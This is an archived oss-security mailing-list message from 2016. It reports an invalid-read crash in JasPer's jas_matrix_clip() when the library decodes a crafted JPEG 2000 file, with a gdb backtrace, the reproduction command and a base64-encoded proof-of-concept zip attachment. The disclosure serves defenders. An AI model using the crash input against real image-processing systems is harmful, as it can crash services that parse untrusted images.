X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3411" "Thursday" "28" "January" "2016" "03:04:17" "+0000" "limingxing" "limingxing@360.cn" "<3626D6E697A150459C44C0E5D8D8D00E0DBD5A35@EX02.corp.qihoo.net>" "71" "[oss-security] invalid Read in the JasPer's jas_matrix_clip() function" nil nil nil "1" "2016012803:04:17" "[oss-security] invalid Read in the JasPer's jas_matrix_clip() function" (number mark "U       limingxing@3 Jan 28   71/3411  " thread-indent "\"[oss-security] invalid Read in the JasPer's jas_matrix_clip() function\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 8116 invoked by uid 550); 28 Jan 2016 04:40:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6101 invoked from network); 28 Jan 2016 03:04:35 -0000
From: limingxing <limingxing@360.cn>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: invalid Read in the JasPer's jas_matrix_clip() function
Thread-Index: AQHRWXiTahDzZlZSeUq365bgomSpLw==
Date: Thu, 28 Jan 2016 03:04:17 +0000
Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBD5A35@EX02.corp.qihoo.net>
Accept-Language: zh-CN, en-US
Content-Language: zh-CN
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
x-originating-ip: [10.200.1.112]
Content-Type: multipart/mixed;
	boundary="_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5A35EX02corpqihoone_"
MIME-Version: 1.0
Subject: [oss-security] invalid Read in the JasPer's jas_matrix_clip() function

--_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5A35EX02corpqihoone_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable


Hello,
We find another vulnerability in the way JasPer's jas_matrix_clip() functio=
n parsed certain JPEG 2000 image files.
I was successful in reproducing this issuel in the jasper-1.900.1-31.fc23.s=
rc.
The gdb info was:
Starting program: ./jasper-1.900.1-31.fc23.src/jasper-1.900.1/src/appl/jasp=
er -f ./jasper_poc/poc.jp2 -F temp.out -t jp2 -T bmp

Program received signal SIGSEGV, Segmentation fault.
0x0805604b in jas_matrix_clip (matrix=3D0x8bc42f0, minval=3D0, maxval=3D255)
    at jas_seq.c:286
286		for (i =3D matrix->numrows_, rowstart =3D matrix->rows_[0]; i > 0; --i,
(gdb) bt
#0  0x0805604b in jas_matrix_clip (matrix=3D0x8bc42f0, minval=3D0, maxval=
=3D255)
    at jas_seq.c:286
#1  0x08066af5 in jpc_dec_tiledecode (dec=3D0x81a05b8, tile=3D0xb785c008)
    at jpc_dec.c:1117
#2  0x08064e7f in jpc_dec_process_sod (dec=3D0x81a05b8, ms=3D0x81a0628)
    at jpc_dec.c:621
#3  0x080647f4 in jpc_dec_decode (dec=3D0x81a05b8) at jpc_dec.c:390
#4  0x0806450f in jpc_decode (in=3D0x819c308, optstr=3D0x0) at jpc_dec.c:254
#5  0x08058e5e in jp2_decode (in=3D0x819c308, optstr=3D0x0) at jp2_dec.c:215
#6  0x08052ba9 in jas_image_decode (in=3D0x819c308, fmt=3D4, optstr=3D0x0)
    at jas_image.c:379
#7  0x08049158 in main (argc=3D9, argv=3D0xbffff094) at jasper.c:229


This vulnerability was found by Qihoo 360 Codesafe Team=

--_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5A35EX02corpqihoone_
Content-Type: application/octet-stream; name="jasper_poc.zip"
Content-Description: jasper_poc.zip
Content-Disposition: attachment; filename="jasper_poc.zip"; size=1097;
	creation-date="Thu, 28 Jan 2016 02:59:45 GMT";
	modification-date="Thu, 28 Jan 2016 02:59:45 GMT"
Content-Transfer-Encoding: base64

UEsDBBQAAAAIALdVPEhJyvtw5wEAABcEAAAJAAAAY3Jhc2gudHh0tZNNb5ww
EIbPQeI/jJTLrgSs8WI+Em1ubdRbpY16qSpkvIY6wkCNd7vKr+/wlW62qdRL
LeHxzDDPvNhmb7mxqqmgM21luL6DzfdWy43ZlMeXl80z7ztp/DDICAnCK9ff
hkEp6Dbojbh+cwjxrqvnOPglBPM671qxwSd47ij4H8FK3QXt0YJvYQw9QaE7
13Gdz5MmMFJIdZIH6FXV8Br2nx73Hx6/eLCXlZaN5Va1DZT8WNvAdciZpITF
JCpANYA9c82tUedc1KqD1eTsyDktRERL4oFWzYnXu2HFz8OKMrZ2HcDB7Qjo
5Y9A3NE0dh2cbm7K1sBKwQ4mmP/QHLVpf/a5B4MZ9vQiOWa+km/3oOAByD34
vvJcZ1UdijUU1nVuCcD/VX0bzh3imJds7NCJ/CBFblUt0bYHCSu0Q4eQE1ak
Hgwp9IskZYKQ9AI+1SI8DMME6XShRzIpL+l4q4TsUUp7+AOv+9mL6bvsmIaI
3r6ikzK6RL8rev0Wsc0IIqJXBCOX6sZy1YzVmdgS1NR2trcGI+SKRFmEJLac
UyqZnEj0X0l0IYUMSfFCogXPlhNXmlfyL7xS2130Bvt7y5bS4YuTDOnJTI+y
kKUDXXOcVtxUYpd5gPY0HGyJg2TReobgvznoo0j4BVBLAwQUAAAACADbWzJI
p81jnEwBAAAnAgAABwAAAHBvYy5qcDJjYGDgyQpQUODlaucCskXSSioLsgqM
FIBsBihtUVqamZJYwHDvTfs7wU1vGQJYCv/euQSUcGBkAIMETgYEEGRgMICw
dIH6M4C0WGZGShGQBqliZ2Bmbwdr40/OzymCGCAAtSz5v///QAZ9sBg7Ax8D
zFgmMJ+BAWENMzsjIxiJ/g9i4GFgAJnDwsLA8D+GQVkpXy6fIZ8h71E6QzpD
2qN4HyBM8WAGQlf/S0CY+D+FQYKBMSA1PbG4tFjBMzcxPTMvXcE5v6gAKMPP
wOidmJ2YUqpbZqxnAhSYCxQA8nwSK1OLdD3z0vKtFHLy0+ONql1Sc0oSdV00
fINdNfWjjeIMzbQgQj4aSZUlqcWasbU6CjA2l4KCroGegY4C0NBUbQMDIyQB
U3QBc3QBS1QBQz0LkIAh1/8JDFzg8MhgYPw/+T9DAxgcaKA2+H8TAFBLAQIf
ABQAAAAIALdVPEhJyvtw5wEAABcEAAAJACQAAAAAAAAAIAAAAAAAAABjcmFz
aC50eHQKACAAAAAAAAEAGAAONVD9dVnRAXw1KPJ1WdEBfDUo8nVZ0QFQSwEC
HwAUAAAACADbWzJIp81jnEwBAAAnAgAABwAkAAAAAAAAACAAAAAOAgAAcG9j
LmpwMgoAIAAAAAAAAQAYAAAr5aKgUdEBid+C/nBZ0QGJ34L+cFnRAVBLBQYA
AAAAAgACALQAAAB/AwAAAAA=

--_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5A35EX02corpqihoone_--
